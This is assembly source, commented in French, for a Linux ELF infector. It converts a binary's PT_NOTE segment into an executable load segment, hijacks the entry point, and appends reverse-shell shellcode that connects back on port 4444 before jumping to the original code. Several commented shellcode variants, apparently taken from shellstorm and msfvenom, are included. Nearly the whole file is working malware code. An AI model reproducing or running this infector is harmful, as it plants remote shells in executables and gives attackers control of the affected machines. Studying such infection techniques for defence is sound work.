section .data
    msg_error db "Erreur lors du programme !!!!!!!!!!!", 0xa
    msg_error_len equ $ - msg_error

    msg_lancement db "[x] - Lancement du programme ....", 0xa
    msg_lancement_len equ $ - msg_lancement

    msg_fin db "[x] - Fin du programme .... infection reussi", 0xa
    msg_fin_len equ $ - msg_fin


    tp_load db 0x01
    droit_write_exe db 0x05

    exagereted dq 0xc000000
    ;p_exagereted dq 0x600000



    p_align db 0x00, 0x10, 0x00


    ;shellstorm
    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05
    ;msf venom clear
    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05
    
    ;msf modif 
    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05,0x6a,0x00,0x5e,0x48,0xc7,0xc0,0x03,0x00,0x00,0x00,0x48,0xc7,0xc7,0x03,0x00,0x00,0x00,0x0f,0x05


    ;msf avec closing de fd 3
    ;0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05,0x6a,0x00,0x5e,Ox48,Oxc7,Oxc0,Ox03,Ox00,Ox00,Ox00,Ox48,Oxc7,Oxc7,Ox03,Ox00,Ox00,Ox00,Ox0f,Ox05


    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05



    ; almost
    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05



;reverse_shell db 0x6a,0x09,0x5f,0x6a,0x1e,0x5a,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x1f,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x20,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05,0x6a,0x1e,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x1f,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x20,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x0f,0x05

;avec dup2 save et restore 
;reverse_shell db 0x6a,0x00,0x5f,0x6a,0x04,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x01,0x5f,0x6a,0x05,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x02,0x5f,0x6a,0x06,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05,0x6a,0x04,0x5f,0x6a,0x00,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x05,0x5f,0x6a,0x01,0x5e,0x6a,0x21,0x58,0x0f,0x05,0x6a,0x06,0x5f,0x6a,0x02,0x5e,0x6a,0x21,0x58,0x0f,0x05

;try avec dup2 sur 4,5,6 d'autre fs --- okay mais pas de connection persistente 
reverse_shell db 0x6A, 0x09, 0x5F, 0x6A, 0x1E, 0x5A, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x6A, 0x1F, 0x5E, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x6A, 0x20, 0x5E, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48, 0xB9, 0x02, 0x00, 0x11, 0x5C, 0x7F, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x06, 0x5E, 0x48, 0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x48, 0x83, 0xFE, 0x04, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00, 0x99, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05 


;0x6a,0x00,0x5e,0x6a,0x00,0x5f,0x6a,0x21,0x58,0x0f,0x05
;0x6a,0x01,0x5e,0x6a,0x01,0x5f,0x6a,0x21,0x58,0x0f,0x05
;0x6a,0x02,0x5e,0x6a,0x02,0x5f,0x6a,0x21,0x58,0x0f,0x05


    ;reverse_shell db 0x90
    
    reverse_shell_len equ $ - reverse_shell
    ;lnvp 4444


    taille_exagereted dq 0x1000

    ;jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
    jump_insctruction db 0x48, 0xb8
    ;ajout de l'old entry point
    jump db 0x00,0x00,0x00,0x00, 0xff, 0xe0 ; e0
    jump_len  equ $ - jump


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1

    file_stat resq 10

    file_size resq 1

    new_vaddr resq 1
    new_paddr resq 1

    old_entry_point resb 4
    jmp_entry_point resb 4


section .text
global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            




; programme bien lancé
    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, msg_lancement       ; affichage du fic debug  
    mov rdx, msg_lancement_len
    syscall 



    ;init
    xor r15, r15
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



;========= taille du fichier =========

    ;taille du fichier
    mov rax,8
    mov rdi, [file_descriptor]
    mov rsi, 0
    mov rdx, 1
    syscall

    mov rbx, rax

    mov rax,8
    mov rdi,[file_descriptor]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov [file_size], rax ;save

    ;reset du curseur
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi,0
    mov rdx,0
    syscall



;========= Trouver segment NOTE  ========= 

mov r15, buffer

;a rendre dynamique plus tard

    xor rcx, rcx                      
    xor rdx, rdx                   
    mov cx, 12     ;  phnum
    mov rbx, 64    ; file header
    mov dx,  56 ; tailles des segments

    loop_seg:
        add rbx, rdx                  
        dec rcx                        
        xor r13, r13      
        mov r13d , dword [r15 +rbx] ; PT_NOTE trouvé
        cmp dword [r15 +rbx], 0x4  ; PT_NOTE valeur
        je pt_note_ok
        cmp rcx, 0
        jg loop_seg


        jmp error 

    pt_note_ok:

    mov [offset_tp], rbx ; Offset du PT_NOTE !!!! 
    
    xor rcx,rcx
    xor rax, rax

    mov rax, [exagereted]
    add rax, [file_size]
    mov [new_vaddr], rax

 

    modification_file:


    xor rax,rax

;=============== Get old entry point =================

    mov rax, 8          ; lseek curseur
    mov rdi, [file_descriptor]
    mov rsi, 0x18     ; offset jusqu'au entry point
    mov rdx, 0          
    syscall     


    mov rax, 0          ; read 
    mov rdi, [file_descriptor]
    mov rsi, old_entry_point  ; adresse où stocker l'ancien entry point
    mov rdx, 8          ; taille de l'entrée à lire (8 octets pour un pointeur)
    syscall

;=============== change entry point =================
    mov rax, 8          ; lseek curseur
    mov rdi, [file_descriptor]
    mov rsi, 0x18     ; offset jusqu'au entry point
    mov rdx, 0          
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, new_vaddr   ; offset + valeur exagéré( c000000)
    mov rdx, 8 
    syscall 




; =============== PT NOte to PT LOAD =================
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]     
    mov rdx, 0          ; type 
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, tp_load 
    mov rdx, 1 
    syscall    

    
; =============== Changement droit  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 4    ; Droit 
    mov rdx, 0         
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, droit_write_exe   
    mov rdx, 1 
    syscall             



; =============== Address offset  =================


    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]    
    mov rsi, file_size  
    mov rdx, 3 
    syscall         



; =============== Virtual address  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 16   ; vaddr
    mov rdx, 0        
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]
    mov rsi, new_vaddr
    mov rdx, 4 
    syscall       


; =============== physical address  =================

;    mov rax, 8          
;    mov rdi, [file_descriptor]
;    mov rsi, [offset_tp]  
;    add rsi , 24   ; paddr
;    mov rdx, 0        
;    syscall       

;    mov rax, 1         
;    mov rdi, [file_descriptor]
;    mov rsi, new_paddr
;    mov rdx, 4 
;    syscall    


; =============== Taille to exe  filesiz =================
   
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 32   ; taille a lire file
    mov rdx, 0
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, taille_exagereted  
    mov rdx, 3 
    syscall          



; =============== Taille to exe memsiz =================
   
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 40  ; taille a lire mem
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rdi, [file_descriptor]      
    mov rsi, taille_exagereted   
    mov rdx, 3 
    syscall         


; =============== p align =================
  
    mov rax, 8        
    mov rdi, [file_descriptor]
    mov rsi, [offset_tp]  
    add rsi , 48  ; alignement
    mov rdx, 0         
    syscall       


    mov rax, 1         
    mov rdi, [file_descriptor]    
    mov rsi, p_align   
    mov rdx, 3 ;
    syscall         

; =============== Ajout shell code  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, reverse_shell  
    mov rdx, reverse_shell_len
    syscall      

;=============================================================
; =============== Ajout instruction de saut  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, jump_insctruction  
    mov rdx, 2
    syscall    


; =============== Ajout offset a sauter  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  



    mov rax, 1    
    mov rdi, [file_descriptor]
    ;mov r9, [old_entry_point]
    ;add r9, [exagereted]
    ;mov [old_entry_point] , r9
    mov rsi, old_entry_point
    mov rdx, 4     
    syscall
      

; =============== jump  =================

    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rdi, [file_descriptor]       
    mov rsi, jump
    mov rdx, jump_len
    syscall
      


sortie:

    ;fermeture fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  


    ;message de fin
    mov rdi, 1             
    mov rax, 1              
    mov rsi, msg_fin      
    mov rdx, msg_fin_len
    syscall 


    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
